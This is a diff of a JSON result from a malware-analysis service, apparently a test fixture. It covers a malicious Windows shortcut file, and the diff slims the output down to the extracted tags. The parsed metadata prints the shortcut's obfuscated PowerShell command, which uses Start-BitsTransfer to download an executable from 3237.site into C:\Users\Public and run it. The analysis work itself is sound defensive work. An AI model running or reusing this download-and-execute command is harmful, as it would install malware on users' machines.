@@ -1,80 +1,36 @@
 {
-    "classification": "TLP:W",
     "response": {
-        "milestones": {
-            "service_started": null,
-            "service_completed": null
-        },
-        "service_version": null,
-        "service_name": "Not Important",
-        "service_tool_version": null,
         "supplementary": [],
-        "extracted": [],
-        "service_context": null,
-        "service_debug_info": null
+        "extracted": []
     },
     "result": {
-        "score": 0,
-        "sections": [
+        "heuristics": [],
+        "tags": [
             {
-                "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [1.3740665169105444, 0.35010382786665806, 3.876724451974264, 2.352161723514434, 0.35010382786665806, 2.6135197342325185, 1.540520964530438, 1.8168232355905944, 3.4952075414928547, 0.5235878925732217, 2.762702200344974, 1.8168232355905944, 1.0374011976541118, 3.0095419864445954, 0.35010382786665806, 2.5048047271711127, 2.7883088224543333, 2.8935719803490696, 2.640686704705996, 2.946203559296438, 2.89357198034907, 3.0187005988270554, 3.018700598827056, 2.6100678850658494, 3.600470699387591, 4.030436394851733, -0.0, -0.0, -0.0, -0.0, -0.0, 0.5235878925732217, 2.7356772435069647, 1.6589284987484891, -0.0, -0.0, -0.0, -0.0, -0.0, -0.0, -0.0, -0.0, -0.0, -0.0, -0.0, 1.4878893855830697, 3.458453829233059, 2.4198877698227546, 2.5052854671342417, 0.699857857026928]}}",
-                "classification": "TLP:W",
-                "body_format": "GRAPH_DATA",
-                "depth": 0,
-                "heuristic": null,
-                "tags": {},
-                "title_text": "File entropy: 2.406",
-                "zeroize_on_tag_safe": false,
-                "auto_collapse": false
-            },
-            {
-                "body": "{\"show_command\": \"SW_SHOWMINNOACTIVE\", \"link_flags\": [\"HasLinkTargetIDList\", \"HasArguments\", \"HasIconLocation\", \"IsUnicode\", \"HasExpIcon\"], \"command_line_arguments\": \"Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\\\Users\\\\Public\\\\o5impa.e`xe;C:\\\\Users\\\\Public\\\\o5impa.e`xe\", \"icon_location\": \"C:\\\\Windows\\\\System32\\\\shell32.dll\"}",
-                "classification": "TLP:W",
-                "body_format": "KEY_VALUE",
-                "depth": 0,
-                "heuristic": null,
-                "tags": {
-                    "file": {
-                        "name": {
-                            "extracted": [
-                                ""
-                            ]
-                        }
-                    },
-                    "dynamic": {
-                        "process": {
-                            "command_line": [
-                                "Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\Users\\Public\\o5impa.e`xe;C:\\Users\\Public\\o5impa.e`xe"
-                            ]
-                        }
+                "file": {
+                    "name": {
+                        "extracted": [
+                            ""
+                        ]
                     }
                 },
-                "title_text": "Metadata extracted by parse_lnk",
-                "zeroize_on_tag_safe": false,
-                "auto_collapse": false
+                "dynamic": {
+                    "process": {
+                        "command_line": [
+                            "Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\Users\\Public\\o5impa.e`xe;C:\\Users\\Public\\o5impa.e`xe"
+                        ]
+                    }
+                }
             },
             {
-                "body": "{\"flags\": \"IDList, CommandArgs, IconFile, Unicode, ExpIcon\", \"file_attributes\": \"(none)\", \"icon_index\": 3, \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"powershell.exe\", \"command_line_arguments\": \"Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\\\Users\\\\Public\\\\o5impa.e`xe;C:\\\\Users\\\\Public\\\\o5impa.e`xe\", \"icon_file_name\": \"C:\\\\Windows\\\\System32\\\\shell32.dll\"}",
-                "classification": "TLP:W",
-                "body_format": "KEY_VALUE",
-                "depth": 0,
-                "heuristic": null,
-                "tags": {
-                    "file": {
-                        "name": {
-                            "extracted": [
-                                "powershell.exe"
-                            ]
-                        }
+                "file": {
+                    "name": {
+                        "extracted": [
+                            "powershell.exe"
+                        ]
                     }
-                },
-                "title_text": "Metadata extracted by ExifTool",
-                "zeroize_on_tag_safe": false,
-                "auto_collapse": false
+                }
             }
         ]
-    },
-    "sha256": "0f13f5f9a53a78fc4f528e352cd94929ae802873374ffb9ac6a16652bd9ea4c5",
-    "drop_file": false,
-    "temp_submission_data": {}
+    }
 }
